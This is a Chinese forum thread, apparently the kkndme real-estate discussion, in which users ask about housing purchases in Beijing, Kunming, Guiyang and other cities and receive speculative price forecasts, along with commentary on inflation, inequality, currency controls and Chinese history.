有去过米兰的朋友可能很清楚，米兰城区的房屋居住的大多数是富豪显贵，一旦出了城区，则是大片大片鳞次栉比的公租房供普通工薪族居住。 以后的中国有可能学习这个模式，原市中心的居民被拆迁安置到郊区，城区居住的都是达官贵人。郊区将形成拆迁安置房、中产阶级商品房、公租房、廉租房混居的模式。 中国的学术 97年我大学毕业的第一任老板就是在龙乡小区买的房，我还到他家送礼。那时从城里骑车到西三旗，花了我将近两个小时。一晃就十几年过去了，真是有很多感慨。 汝爱之罪： 感觉您是学者型的啊，看您去做田野调查什么的。大学毕业送礼给老板。。。。 看您点评回龙观的那一段，估计很多人要捶胸顿足的后悔了。回龙观真是个奇迹，从2600涨到15000，让所有人大跌眼镜。 kkndme： 送礼也算学者型？晕 九五二七八： 他是说本以为你是学者型的 不需要送礼 现在看到你说送礼 觉得自己判断失误了 呵呵 现在这个时代 学者也需要送礼啊 汝爱之罪： 差不多这个意思，呵呵。我一直以为楼主是搞学术的。 其实吧，虽然大多数学者砖家都成了贬义词，但我觉得在北京这个大环境里，还是有土壤培养一些目光敏锐犀利的人，BBS的P民也需要这样有前瞻性的引导者，因为毕竟不是每个人都强大到能把这些东西娓娓道来，没有积淀，根本悟不出。 kkndme： 中国的学者是很难拿出点时间好好搞搞学问的，功利性太强。 以前跟一伙民族学者到元阳考察，这帮人没呆满两个星期就跑回去了，说是又要评职称了，人不能不在单位。而日本学者已经在元阳与当地人同吃同住了3年，还没有一次回日本。真不知道这帮民族学者研究了两个星期的东西能发表什么样的惊世论文出来。 北京远洋山水 tianxiaobing11： 不知楼主了解远洋山水吗？在西四环外，我舅舅想在那买房，去年一万七没买，今年最高到过三万，现在两万六左右，能买吗？还有升值空间吗？诚心请教。 kkndme： 别提了，08年的那次调控，开盘才1万1，这是个让人悔得肠子都青了的楼盘。 北京的楼市前景，在未来的两三年，北四环西四环东四环达到5万，北五环西五环外到达3万应该不是什么难事，南面可能相对低一点。远洋山水的位置2万6不能算便宜，但将来只有更贵。 精英的资产 5万一平的房子对于中国的精英阶层真算不上什么。500、600万一套的房子一次性付清的人群在北京大把的存在着。这是很多工薪阶层一辈子都觉得不可能挣到的财富，但对于另外一些人却可以轻而易举的拿出来。平均工资的概念在中国是完全没有用处的。 北京三环塔楼 bluesyang2010： 请问楼主，北京三环内的塔楼，80年代末的房子，以后会有什么走向，现在能出手吗？谢谢 kkndme： 三环内都是老公房，干嘛不买个板楼呢。这种房子老到不好住了，迟早还是要换。板楼还可以拆迁，塔楼拆迁就比较困难了。不过今后的北京可能存在一个相当奇怪的现象，一部分高端富裕人群居住在市中心老旧的小区，而令广大住在远郊的中产阶层羡慕不已。 普通人买房的未来 baiyang11112010： 直白说，我刚毕业一年，完全靠着父母资助，要完全靠自己根本买不起房，我一些同学在北京两人的话年薪也就15万左右吧，现在好歹还能惦念着买房，要是像您所说，\"北四环西四环东四环达到5万，北五环西五环外到达3万应该不是什么难事\"，那他们根本就没有盼头了，这是很可怕的事啊 kkndme： 将来年薪20万的中产阶层一定连北京6环内的房子都买不起。这一天，不会很远。 北京房价超香港 tianxiaobing11： 金岩石说未来五年房价还得翻一翻，北京核心区域得到二十万一平，真会那样吗？请楼主说说 kkndme： 北京北四环，东三环，西三环，南二环内区域的房子，价格一定会超过香港。 tianxiaobing11： 香港怎么也得几十万一平吧，还是得早买房，早买早心安 kkndme： 香港都是按尺算的。富翁住的千尺豪宅相当于我们的大约100平米。现在香港的房价换算成平米大概是十五、六万一平吧。 中国的新闻不可信，精英的有钱是你想象不到的 bluesyang2010： 搂主分析一下,现在的新闻都说房屋成交量的上升是因为kfs打折才上升的,但这个很不成立,为什么新闻这么懵老百姓.是不是政策上还有可能收得更紧? kkndme： 中国的新闻最不可信，为了抓眼球不惜胡编乱造，不惜前后自相矛盾。我倒觉得这个成交量放大的背后的意义更值得深入研究。 在二套房首付50%，三套房首付更是严格控制的前提下，成交量大幅提升，中国的货币到底泛滥到何种程度，中国的精英阶层的绝对数量多么庞大，手里多么有钱。中国的贫富差距很可能已经达到了一般人不敢想象的程度。 这是一个坏的预兆。 40年的商住房没有70年的住宅有投资价值 klid： LZ 请教一下，市中心没有天然气的房子能买么？自住兼投资 kkndme： 商改住，40年产权？ 不影响出租，但是变现可能不那么容易。 klid： 是70年产权住宅，但是不通天然气！ LZ请教一下啦，可以自住兼投资么 klid： 自住只要你觉得不用天然气也很方便，当然没问题。 投资首先是出租不存在问题，另外市中心的位置可以填补任何房屋设计方面的不足，70年产权具备投资价值。购买这样的房产还是可以的。 限贷对精英没用 tianxiaobing11： 楼主，我也是不明白，现在成交量确实上来了，按说现在贷款控制的这么严，第三套房都贷不到款，是谁在买房，难道都是第一套房的刚需吗 kkndme： 民币发行泛滥，有钱人绝对数量庞大。在北京上海等城市，手中拥有千万现金的人不在少数，都是全国的精英阶层啊。精英阶层的财富积累已经逐步完成，提高首付，严控贷款只能抑制小白领保值的需求，但对于精英阶层是没有任何作用的。 如果将来推出房产税就更好笑了。精英阶层谈笑风声，小白领神情紧张，最终结果是全部转嫁租房客。 bluesyang2010： 我认为,这个跟kfs和政府之间的博弈有很大关系,投资人前段时间一直在观望或者投入到农产品等领域,我不记得是7月还是8月,突然听到热钱大量涌入国内房地产市场的传闻,之后成交量就上来了,这些信息之间有很大的关系,但我捋不清. 请楼主评评 kkndme:： 你说的很有道理，当资金泛滥无处可去，一定会找到一个出口。资金如洪水在于疏而不在于堵，资金一旦冲破调控所筑的堤坝，将一发不可收拾。所以屡次调控屡次暴涨。如果不能有效开渠，将注定调控政策的失败。 tianxiaobing11:： 我现在就被抑制住了，现在是认房不认贷，我也不能贷款了，可现在动不动就得百万以上才能买房，真是力不从心啊，房贷新政看来是堵塞了中低收入的房产投资渠道了，对精英阶层反而是利好，这调控就搞笑了 bluesyang2010:： zf倒是想调控精英层呢,但zf本身就是精英的组成部分,所以zf只能借砍掉投机者之名,开拓自身,抢占市场,特别是楼主说的租赁这个大市场,所以特别佩服楼主之前说的:zf找到了吃租赁这块蛋糕的最好时机,明着是抑制房价,其果却是让很大部分老百姓租着zf的房,zf的钱就更多了,到时候想拆哪儿拆哪儿,精英更精英,百姓更百姓....可悲呀 kkndme:： 估计给政府出这主意的幕僚熟读过宋史，宋代官府就是靠出租房给群众敛财的。 外汇管制决定了大部分有钱人只能在国内投资 tianxiaobing11： 还有一个问题始终不明白，请教楼主，现在五六百万的房子都有人全款买，这些人为什么不买国外的别墅呢？难道就因为中国的房子升值快吗？要我有那么多钱早移民了 kkndme： 我国实行的是外汇管制，人民币不能自由兑换，不可能大批人口通过地下钱庄转移资产。只有官员和少部分有背景的高端人士才能做到人民币资产顺利兑换转移。 一旦发现较多资金量的人民币兑换美元出境，国家将采取强制管制措施。 现在国家对外汇外流已经非常重视，携带价值50美元以上的商品入境都要交税，实际上国家给出了一个不希望人民币兑换成外币外流的一个强烈信号。 外国国籍在中国生活是更好的选择 理财的猫咪： 我有段动过移民的念头，但现在基本放弃了。不知自己的选择正确与否，想听听楼主高见。 kkndme： 移民不见得能够适应，毕竟文化差异太大，但是如果拥有一个外国国籍，在中国生活，是一个比较好的选择，至少，你的财产是受到保护的。 分期付款买房，如果房价上涨，很容易毁约 & 自住要选大品牌开发商 showcar:： 楼主说的正确啊，除非世界经济再次崩溃或者朝内变天，否则的房价要跌，太难！ 到处听说是纸币不受截至的发行，有点现金留在手上都发抖啊，是因为\"贬值\"发抖！ 所以，出手了，淘一套保值去吧！！总价150万左右。 楼主请教付款方式： 1：分期付款，30%首付，6个月内付30%， 12个月内付30%，10%交房前付清（约24个月）； 2：商业银行贷款，需要50%首付，50%余款贷款，首付3个月后按揭，110%的贷款利息。 商业贷款的话，计划交房后就付清。 不知道哪个更合算？期待楼主解惑。。。。 kkndme:： 分期付款是你和房东的约定？这个比较不靠谱，如果是付清后过户，一旦房价上涨，很可能出现毁约。 showcar:： 楼主，忘记说了，是期房，我们这里是房子盖到一层高就预售了。房子结顶是按揭。结顶后1年半左右交付。 kkndme:： 貌似你们那里的房产商很不规范。我还是觉得投资自住都要选择大开发商、大体量楼盘，不仅配套好，升值空间也大，这样的楼盘几乎没有风险。 通货膨胀和房价的关系 要解释通膨和房价的关系，我来建个简单的模型，跟大家说说 假设5年前，某个国家一共有10个一篮子生活必须品（包括吃，穿，住，行的所有的必需品），这个国家发行了100万货币，一共有10个人。那么这个国家的毎个篮子生活必须品价值10万。 假设这10个人每人得到了10万元收入，则每个人刚好分配了一个篮子。 实际情况是，这10个人中，有人得到了10万元，有人得到了8万元，有人得到12万元。那么这10个篮子通过在品质上的差别有所区分，卖给这10个人，刚好1人1份，只不过有的品质略好些，有的品质略差些。 时间过了5年，这个国家增加到20个一篮子生活必须品，人口还是10个人，但是发行了1000万的货币，那么这个国家的毎个篮子生活必须品价值50万。价格翻了5倍。如果每个人平均是100万，则每个人可以得到2篮子生活必需品，生活提高了。但实际上是，这10个人中，4个穷人每人还是10万，3个普通人每人是20万，剩下3个富人每人300万。 这3个富人共900万可以买掉18个一篮子生活必需品。剩下7个人只能分配到2个一篮子生活必需品。这样势必有人会饿死。而且无论是穷人还是普通人都买不起任何一个一篮子生活必需品。社会不可能只有富人才配生存，没有穷人，富人就不会存在。 因此必须有一项物品能够从一篮子生活必须品中剥离出来，吸收掉富人庞大的资金，同时也要让穷人和普通人能够买的起一篮子生活必需品中能够维持生命的最基本的生活品。 于是就要把一篮子生活必须品进行拆分。找到一项物品，不拥有不会饿死，但拥有能够让人过的舒服，具备高的使用价值，能够保存，具备稀缺性。 这个东西就是具备产权房屋（注意不是使用权），而一篮子生活必须品中其他的东西都不具备这个条件。 吃的不能保存， 衣服不具备稀缺性， 土地和房屋，是生产，居住，商业贸易的必需品，可以保存，具备稀缺性，富人拥有房屋土地的所有权可以租给普通人和穷人进行生产和居住。土地和房屋超过租金部分的溢价就变成了富人中吸收资金，炫耀财富的特殊品。 所以请注意，真正吸收大量发行的被富人拥有的货币的，是土地和房屋超过租金部分的溢价，所以房屋的租售比很低是货币大量发行造成的。房屋土地租金成为了新的一篮子货币中的必需品，而房屋土地所有权被剥离出来变成了富人之间货币再分配的游戏。 这样一篮子生活必须品进行了重新定义，本来包括的房屋，变成了房屋租金，而房屋所有权被从一篮子生活必须品中剥离出来，变成了吸收富人多出来的货币的奢嗜品。而一篮子生活品分成两大类，即最基本的和品质高的。 最基本的又变成了10万一个，保证这个国家的4个穷人可以每人得到一份。 品质高的，20万一个,3个普通人和3个富人每人得到一份就可以得到较好品质的生活。 多出来的840万，就是房屋的所有权，供3个富人拥有。房屋所有权的价格远高于租金，这是因为房屋所有权已经变成了富人炫耀的资本，身份的象征。 因此说，高房价的根本原因是由于货币发行泛滥和收入分配不公。这个根本问题不解决房价不可能下降。 而且单纯的依靠行政手段让房价下跌不但不能抑制通货膨胀，多出来的流动泛滥的货币得不到有效吸收，会推动生活必需品上涨，使穷人的生活更加艰难。 当然，有人的说，这多出来的840万为什么不投入到创新领域带动需求，增加一篮子生活必须品的品质。 这显然是不现实的，900万的财富集中在3个人手里，剩余7个人总共只分到100万，而平均一篮子生活必需品的价格是50万，7个人应该有350才能满足生活需要。购买力的不足一定会使远离生活必须品的任何东西都没有市场。 高房价，低租金是货币泛滥发行和分配不公的必然结果，而不是推动通货膨胀的，阻碍实体经济发展的原因。 货币泛滥和分配不公才是实体经济发展困难，房价高企的根本原因 fataltomato： 有钱人的投资渠道一般都不是房子 房子最多是资产配置中的一项 开始投房收租，说明财富控制能力的下滑，往往意味着人生下坡路的开始 所以诸君，还是努力赚钱改变人生为第一要务 评来论去，于事无补 别人说到了，你不一定明白，你明白了，不一定有体会 你有体会，不一定能做到，你做到了，不一定能做好 你做好了，还不一定有机会呢，呵呵 welldayzwb： 对于不善理财的人来说，买房收租未尝不是一个选择，到没必要上纲上线，当然为了收租而买房，目前看起来不是很理想的一个选择 南京买房分析 & 买房要做好调查分析工作 闲坐庭前也： 楼主，一直跟帖， 觉得你的认识颇有见解 请教一下 最近看了南京奥体附近的仁恒楼盘 2万2左右每平方 不是自住，用做投资的话现在出手是否合适呢？ 一直在犹豫中 望不吝赐教 kkndme： 尽管南京去过多次，但对于那里的楼盘并不熟悉，所以不敢妄言。如果能够提供更详细的信息，或许可以试着为你分析。但以你目前提供的信息，真的不好评判 闲坐庭前也： 恩， 详细的话就是南京河西奥体那块推出了仁恒G53精装公寓 简称高汤，90平方复式上下两层的，180万左右 我对南京不太了解 有人说2014青奥会召开， 有点升值空间 我不准备贷款 因为平时也不怎么会理财 全付可以95折 楼主，请问我能买进吗？ 汗一个先，我买房好像总买在高点呢 泪奔 不知道这次怎么样 楼主不吝赐教哦！！！ kkndme： 房产毕竟是一笔相当大的投资，对于一个不了解的城市，就轻易购买，显得过于轻率。青奥会是噱头但不是利好，对于房产的长期升值没有任何促进作用，充其量也不过有些资金参与短线炒作。 经济的发展才是一个城市房价上升的驱动力。 建议在你购买之前，认真去南京进行考察。不但要考察周边楼盘，还要考察你所购买地区的经济发展状况、交通状况、商业和学校的分布。最好能够了解当地政府的规划。 北京华清嘉园 dog19972009： 请教楼主点评华清嘉园的房子以及上地一带的房子，谢谢楼主！ kkndme： 学区房，房价坚挺，配套齐全，环境也还凑活，紧邻轻轨，唯一的遗憾就是交通比较拥堵。如果有钱是可以考虑的。但是绝大多数人只能对华清嘉园的高房价兴叹了。我预计两到三年内，华清嘉园就将冲击5万关口。 上地可参加前两页的评述。 dog19972009： 谢谢楼主，但如果是上地的低密度低板房格局朝向及位置都较好的小3居可以考虑吗？另外知春路一带的九十年代的塔楼还有板房可以考虑吗？ kkndme： 北四环周围有许多不错的小区，都值得考虑，无论自住还是投资都还是比较合适的。比如志新村、塔院、牡丹园小区等等，配套齐全，居住舒适，特别是志新村还是学区房，这一片区位肯定是好过上地的。缺点就是户型较老，物业等于没有。 中国的朝代更替 中国与西方最大的不同，是历次革命都要推倒重来，革命总是伴随着血琳琳的屠杀和破坏，无论是财富还是文化。每次建朝人民都要从一穷二白做起，所以才说中国人民苦难深重，几千年的历史，居然没有什么积累，有的只是统治者根深蒂固的帝王思想世代传承。 从项羽焚烧阿房宫到近代的破四旧，革命的都非常彻底，人民洗脑也非常彻底。所以帝国时代才能够一直延续。西方人贪婪对财富是占有和继承，东方人重义轻利所以破坏焚烧和屠杀。 西方的大革命产生了资产阶级新贵阶层，然而当时却不为普通群众接受，尽管他们有钱有势，但是却得不到群众的尊敬，直到资产阶级新贵们捐钱捐物，为群众做了大量的善事之后，才得到人民的认可。 而我们这个时代产生的新贵却太多的为富不仁。 而中国古代的乡村，通常族长就是村子里的大地主，族长是非常重视名胜的，一个族长必须有足够的威望，象修桥补路，借无米下锅的族人粮食，都是族长份内的事。去徽州旅游的人都知道，道路、桥梁等公益设施无不是富商修建。古人不但讲个人声望，还讲积阴功。假设你去贵州的深山中旅游，发现山径上常常有个亭子，不但有坐的地方，还有水井或者用水管从山上引来的泉水供路人休息。这都是周围的村里人为积阴功修建的，绝非政府投资。 时值社会主义的今天，反而一切行善积德的事都不讲了，全民金钱至上。没有文化建设的民族是悲哀的。 中国可以无限印钞吗 tianxiaobing11:： 中国可以无限印钞票吗？有没有个限度呢？我是请教楼主，肉食者会怎么思考呢？他们的幕僚能从历史中找到答案吗？楼主的历史资料库中有这方面的吗？ kkndme:： 如果你收集过铜钱，你会发现有一种大钱叫一当十五。这就是中国古代的铸钱方式。当铜不够了，zf用铸造2枚铜钱的铜铸造一枚大钱当作十五个大钱用。那时还没有纸币，所以采取了这种方法。 到了解放战争时期，物品紧缺，国军大量印制金圆券，今天用一捆钱没一斤米，明天用同样一捆钱却只能买一两米。当然这种金圆券无限制满天飞也和我军大量投放伪币有关。 当物质紧缺时，必然会通过发行纸币来缓和矛盾。小时候我常去买2毛钱的肉馅包一顿饺子，现在2毛钱仍在大街上也没人捡。肉馅从2毛钱涨到4块钱，货币贬值了20倍。为什么我们认可肉馅从2毛钱涨到4块钱的既定事实，但是却不能想象现在的物价会在未来的10年再涨20倍呢。 如果你收集过邮票，会发现50年代的老有票的票面价格都是500元一张，1000元一张，我们建国后的货币也并不是一开始就是圆角分的。50年代圆是最基本的货币单位，随便买个最小的东西，都是1000元起步的，很象现在的越南盾。 我们国家的印钞制度，主要跟外汇挂钩，在帖子里已经做过了描述，你可以在帖子里找一找。正是由于国内商品的内需不足，完全依靠低附加值商品出口创汇，才造成了人民币的外升内贬。 读史读的不是故事，还是找历史规律，以古鉴今 读史读的不是故事，还是找历史规律，以古鉴今，毛就是这方面的天才。 读史难在古人常常作假，事件往往扑朔迷离，必须象破案一样，从重重的迷雾中寻找真相，这也是读史的乐趣所在啊。 好比喜欢三国的度魏延，总认为此人天生反骨。事实上，魏延作为仅次于关张马黄（没有赵云，赵云的才能和级别都不能和魏延相比）的第五员上将，在关张马黄死后，成为了西蜀的军方顶梁柱，不但有极高的军事天赋，而且忠心耿耿，不足的是政治头脑不大灵光，结果诸葛亮刚死，就被小人杨仪给黑了，不但掉了脑袋，还被按上了背主的罪名。 汝爱之罪： 《三国演义》里这一段完全是黑魏延来着。 我心里还想，其实魏延还是比较大度的，马谡刚愎自用的时候，诸葛亮很不爽，但是魏延还一个劲的替马谡说好话，我就觉得魏延一直忠心耿耿，怎么可能晚节不保呢？ 唉，看来正史和演义，还是有很大区别啊 kkndme： 正史里很多信息都是极其可疑的，就更别说演义了，呵呵。 每次听评书赤壁大战一段，诸葛亮给关张布置任务就觉得好笑，赤壁大战时诸葛亮官拜军师中郎将，官职远不如关张，关张不可能直接听诸葛亮的将令。当时，诸葛亮顶多给刘备出出主意，调兵遣将还应该是刘备的事。演义一夸张诸葛亮，，就没刘备什么事了。 毛太阳往事 当年毛太阳发动文ge的原因是因为政府被刘奇和邓平的政经系所把持 当年要是老毛召开人大来决定谁去谁留，老毛肯定被PK掉 如此不发动底层，通过正常的程序夺不回权利 什么防止腐败，打到走资派都是借口 毛太阳比任何人都要腐败 死的时候存款有1亿多（不是工资积攒的，都是稿费，垄断市场的稿费） 70几年的时候，1亿多，确实恐怖 但是后来被邓平给没收了，讽刺呀，以这是全党的财富为由 北京大兴 VVVMMMABC： 楼主,现在大兴的房子新楼盘较多,某楼盘推出两次均卖光光.地理位置占尽优势,因为紧挨着将要建好的地铁.现在能出手买吗?首套,没有立马买房结婚的压力,但三四年内总得买吧.首付提高后也就刚刚好付首付.要是利率也真的不打折,真不知道如何是好. kkndme： 通州、房山、大兴都是前期炒作比较厉害的区域，在楼市调控期要慎重购买，如果遇到明显低于周边二手房的楼盘可以立即下手购买，否则观望。 VVVMMMABC： 楼主圣明,楼主说得明显低于周边二手房的话是指大于多少一平的时候呢?现在的二手房和新房都互相盯着呢,都差不多 kkndme： 一般来说调控期内，郊区新盘比调控前的周边二手房大约低10-20%%之间，且成交放量，说明底部已见。 贵阳 努力看透： 楼主，谢谢你对贵州的关注！ 我是贵阳的，想听听你对贵阳的看法，我07年在小河区2400买了120平方的新房子，今年八月初买了套市里的二手房，93年的，65平方，学区房，总价43万，送家具家电！ 非常想听听你对贵阳房市的看法，还有金阳新区的看法，感觉金阳就是房地产撑起的，如果地产有个风吹草动，金阳会是最容易受打击的，不知对否？ 另外93年的老房子以后卖时不好贷款，是不是会影响成交价格？ 谢谢 kkndme： 刚从贵阳回来没多久，呵呵。 贵阳投资房产有一定的风险，主要是城市比较小，不好变现。如果我在贵阳投资，即使再贵也会选择喷水池附近市中心的楼盘，稀缺性较强，变现相对容易。 贵阳是一个城区尚未开始升级改造的城市，zf大力打造金阳花溪等外围区域，但是将来一定会遇到较大的交通瓶颈，城区的升级改造早晚都要启动。 关于金阳实际上就是政府的造城运动，因为市政府的搬迁对房价有一定的支撑力，但是随着人口的大量入住，从金阳到主城的交通可能出现瘫痪状态，谁又能保证政府不进行二次搬迁呢？ 贵阳的美女确实很多啊，是这个城市最靓丽的风景，令人留恋。 努力看透： 贵阳小了，为什么房子不容易变现呢？毕竟全省只有贵阳繁华点，地方小，人多，更应该容易变现啊！我指的是市区房，不含郊区 kkndme： 市中心中高档房屋变现是没问题的，但市中心老房变现也不是很容易。贵阳的城中心改造升级还没有启动，市区存在大量的老公房，而贵阳最需要的是改善型中高端住房。现在zf全力打造金阳等外延区域，大片的新楼盘拔地而起，二手房交易的活跃度远不如其他省会城市。 贵阳与成都、昆明这些西部城市略有区别，昆明、成都有大量的外地人口，这些外地人口构成了买房刚需，因此市区位置的稀缺性就显得尤为重要。 但是贵阳的外地人口相较昆明、成都要少，以本地改善型需求为主，所以城区楼盘的档次尤为重要。 作为相邻的省会城市，重庆的吸引力要大于贵阳，贵州许多地州的资金可能会被重庆分流。 富人越富、穷人越穷 我爱的飞飞： 其实很多空军比较SB，天天叫着加息，说是提高收入就可以买得起房子，试问穷人手里10万，富人有100万，按照现在的利息，穷人每年整存整取10万不开税收是2250元，而富人得到的是22500，加息以后假设穷人每年收入是4000，富人是40000万，成千上万的富人每年多出40000，而生产资料和资源是有限的，当每个富人的4万流入市场，试问是不是又要通膨呢？所以加息是最愚蠢的均贫富方法。行之有效的办法其实是重新发行货币。但是除了改朝换代几乎不可能。 其实穷人一穷就注定穷下去，除了少数几个可以翻身，原因很简单，因为生产资料掌握在富人手中，富人为什么有生产资料的支配和拥有权，答案很简单，只有革ming。 由此则可以明白为什么房子可以按照富人的想法定价，就因为土地，建材等生产资料掌握在富人手中。 妄想房子降价其实是更愚蠢的想法，为什么？GCD拼命给公务员和arm加薪，这些钱用印刷机印出来发到公务员手里最终却让老百姓埋单？统治阶层当然首先第一位维护和最大化自己的利益，任何朝代都是如此，只有当民心涣散的时候才出台一些政策缓和民心。现在看CCAV，对社会主义这充满美好想象的词的强调都逐渐弱化了，你不得不承认，在GCD的领导下大家都有肉吃了，国家安定，在这里嚷嚷的，不过是对贫富不均不满而已。 kkndme： 今年朝鲜搞货币改革，重新发行货币，结果导致不可控的通货膨胀，财政部长给枪毙了。 我爱的飞飞： 所以民众还是愚蠢的，只看到了15元最后换成1元的落差和失落，没有看到除去附加值的生产资料的价值。货币改革是富人最不愿意看到的，跟加息是一个道理，因为改革让货币的附加值骤然缩水，富人的货币不再比穷人有更多的附加值，而统治阶级恰恰是富人，没人愿意搬石头砸自己的脚。所以为什么我说不可能。 通货膨胀的形成原因 我爱的飞飞： 在谈谈通膨是怎么形成的。生产资料是有限的，生产资料其实一直都没有变，而货币只是一种虚拟附加值而已。像楼主所言，一个国家，有人手里有8元（假设他是建材行业的），有人有12元（假设是石油行业的），但是人心不足蛇吞象，建材行业的员工觉得不够用了，8元的想变成13元，石油行业的12元想变成20元。因此，建材行业把原来卖8元的水龙头提价成13元，对于石油行业的人，装修的时候拿着12元发现自己买不了13元的龙头了，于是琢磨着把石油卖到20元，由此各行业依次提价，物价越来越高，实际上水龙头还是水龙头，一桶石油还是一桶石油，生产资料始终没有变，稀少，远远不够人均分配，但是生产资料的价值变了，提高了。拿成都的房价为例，02年的时候成都人均收入800-1200，房价2000-4000，约为房价的3倍，现在成都人均收入2500-3000，成都房价7500左右，仍然为3倍比例，看似7500比2000翻了多翻，实际上房子作为所谓的生产资料，始终是稀缺的，在02年的时候，拿着当时的工资买4000的房子仍然不容易。任何时候，其实都是一种相对平衡的比例，而空军喜欢拿现在的工资跟过去的房价相比，但是那种状态太过理想，想明白的，就会觉得房子不贵。 什么时候房价会下降，一句话供求关系，人口减少是房价下降的唯一出路。即便是出台房产税，很有可能富人顶着房产税不卖，变相加租抵消房产税，特别当今租房市场存在中介的操纵，很多房子都是通过中介渠道才租出，垄断的中介忽悠房东集体涨价，房产税很容易就转嫁给租房者。ZF也不是完全不作为，当你开着车逛着公园坐着快铁地铁的时候，就应该加速印刷的钞票有一部分投入了基础设施建设，如果不通过税收和出让土地收入来建设，我们很可能还走在乡间小路上。 虽然瓷器国是中yang高度集权的国家，但是任何朝代都是诸侯之间相互制约，上面出台个政策，各个诸侯执行与否或者执行是否到位都可以影响房价甚至很大影响，且不谈上面是不是真的想降房价，即便是动真格，下面的诸侯听不听招呼是另外一回事。有心无力的事情不是不可能发生。共同富裕其实是一种美好愿望，因为人与人的竞争天性，不可能人人平等，只要有人还想凌驾于其他人之上，就永远不可能GC主义。 任何社会都是这样的形态，忍无可忍-geming-平稳-不满足-垄断与剥削-改革-改革失败-再次忍无可忍。为何历史反反复复如此？就是因为人的劣根性，因为人性的贪婪。所以周而复始而已。 人性的贪婪决定了社会进程，刚开始穷人只想平均，从富人手中夺取生产资料，当GEming之后，穷人开始不满足于仅仅是平均，穷人想要凌驾于其他人之上，想变成富人，于是利用geming占有的各种手段获取利益，最终变成了富人，被凌驾的穷人再次想通过变革改变自己的地位。。。。如此循环。。。 深圳 & 昆明仇书记 & 通货膨胀体制内高枕无忧、体制外自求多福 sprina0321： 楼主真是高人啊，追了两天，终于看完了。也想向楼主请教下房事 不知楼主对深圳了解吗，我们来深圳七年了，结婚也好几年了，可是最近才去布吉买了首套，布吉的可园，二手，单价一万四。现在深圳关内10年的二手都一万六，好一点的两万，关内基本没新房了，有的都3万左右了。大量的新房都在关外，基本2万吧。我们本来也想买关内，可是想着同样的价格在关外可以买好点的，就买了关外，不知这个决定是否正确？按楼主的意思，还是要买市中心，可是市中心的话，只能牺牲面积，房子也旧，这样住着也不舒服啊。 另外，我父母就在昆明，他们本来在一环上有套房改房，挺方便的，就像楼主说的，可恨的仇书记要制造需求，现在他们的房子说是要拆了，他们现在想买，可是一环外的都8000多，他们觉得有点贵，买了以后，手上的钱就都用完了，又想干脆等回迁。楼主觉得要不要买呢？ 我父母就我一个孩子，他们在深圳买过一套房子，就是市中心的塔楼，等我们不住了，这套房子要不要卖掉，还是留着出租好？ kkndme： 深圳不太了解，不过宁肯牺牲点品质也要选择市中心，这是无数人经过从市中心搬到郊区大户型再搬回市中心老房子而取得的宝贵经验，当然如果你在关外上班就另当别论了。 往历史人物上套，qh应该算作集酷吏与奸佞于一身，横施暴（）政早晚落到身败名裂的下场，不是不报时候未到。等拆迁主要是在昆明风险比较大，几年不知道能建起来，志远综合体就是很好的例子，如果有能力不妨先买一套。 至于说房子卖不卖关键你是否需要用钱，如果不需要，又没有更好的投资，不妨先留着。 sprina0321： 我有时候想，像QH这样的人应该不得好死，断子绝孙，老天还真是不长眼。 请楼主明示 志远综合体是怎么回事 我父母家就在东站，董家湾中间那里，原来厂里也在，现在厂子搬到开发区了，家里的房子也逃脱不了被拆迁的命运了。 现在家里在一环出去点看中一个房子，房子挺不错的，大社区，新房，算下来9000多，不便宜啊。一环内的估计我们买不起，家里人年纪大了，想住电梯房。 楼主对昆明现在的房价怎么看呢，会不会回调，感觉今年涨很多。 现在9000，难道以后涨到2万，和深圳现在价格一样？我和老公也工作很多年了，现在年收入30多万，我们都买不起2万的，我们去看过万科在深圳的新盘，房子没得说，带精装修，2万多一平，一套要300万，虽然很心动，也只能放弃，怎么现在昆明人这么有钱了？ 按照通货膨胀来说，如果以后昆明的房子卖2万，那深圳的岂不是要卖4万，那我们的收入也会涨到60多万吗？哈哈，实在算不过来了。通货膨胀对我们的收入有影响吗 kkndme： 一环外9000多的新盘，昆明还真没几个，滨江俊圆9000多，但容积率太高，又有大量的回迁户，个人很不看好。翡翠湾达到了12000，云上城、翠园等要开的楼盘估计开盘价也要上万了。呵呵 昆明的房价，我预计市中心将达到2万，一环二环间15000，滇池板块将达到12000，北市区及世博板块将达到1万。东市和西市在8000-9000。螺丝湾板块最不确定，但未来不会低于9000。 志远综合体早在几年前完成了莲花池片区的拆迁，但迟迟不动工盖房，时隔几年一点动静都没有，拆迁户没有买房的现在还在租房住。 关于通货膨胀问题，体制内的职工工资一定会与时俱进的。体制外人员的薪水不取决于通货膨胀，而是取决于行业的利润率，企业的利润和个人的能力运气。对于多数竞争激烈，产能过剩行业内的民营企业一般员工，工资增长是很难抵御通胀的，而且由于通胀导致生产成本的价格上涨，减薪甚至裁员的可能反而更大。 长春 wkzjx2008： 楼主你好，请帮我分析一下，谢谢 我在长春 长春的市政府在前几年的时候搬到了城市的南部，南部因为是空地，所以盖的都是新盘，价钱现在7000多，而我工作的所在的位置是原来的一个商业区，这里原来都是学校，医院和一些机关单位，好企业的家属楼，因为原来的购买力强所以居民楼的一楼都变成了小店铺，所以形成了这个城市的一个没有大商场的一片繁华商业区，但现在随着原住民的逐渐迁走，这里租房的人多。但这里有一个优势是离市里最好的小学和高中都很近，这也是这里房价坚挺的原因。现在这里的二手房如果是大户型在5000左右每平米，小户型6000左右，基本都是八九十年代的房子，2000年以后的次新房很少，距离这个区域较近的一个新盘是商住两用的卖到9000多每平 孩子现在在这上幼儿园，堵车太厉害了，为了孩子我在这租的房子 我现在手里有20万现金，请问这片区域值得购买么，买大的还是小的，我已经贷过一次公积金贷款，现在已经结清 现在这个城市很远的地方新开的楼盘也要4000多一平米 请楼主赐教，不胜感激 kkndme： 政府所在地区域又是学区房，这样的房子优势还是很大的，但是由于有大体量的老房子存在，将来有可能大规模拆迁，而拆迁补偿却决于zf是否铁腕，如果遇到铁腕领导，补偿额一定不会太高。这是购房的风险。对于非一线城市，新盘的风险肯定小于老房。 佛山 爱佛僧傲瞪詹牧师： lz高人！ 不知道来过佛山没有？佛山紧邻广州，两地的地铁即将贯通接轨，房价应该会快速飙升，但是另一方面，佛山是个制造业城市，村镇工业高度发达，外来打工的比较多，流动性很大，lz所说的，今后买房只是有钱人游戏，房租会高涨，这点对佛山这样的小城市不知道成不成立？村镇里还是有很多便宜的出租屋的，高端点的打工者，如果房租太贵，应该会嫌贵干脆回家发展，最后只能留下低端制造业产业工人吧？这样房租应该还是很难上涨。 kkndme： 佛山还真没去过，只去过东莞和中山，呵呵。 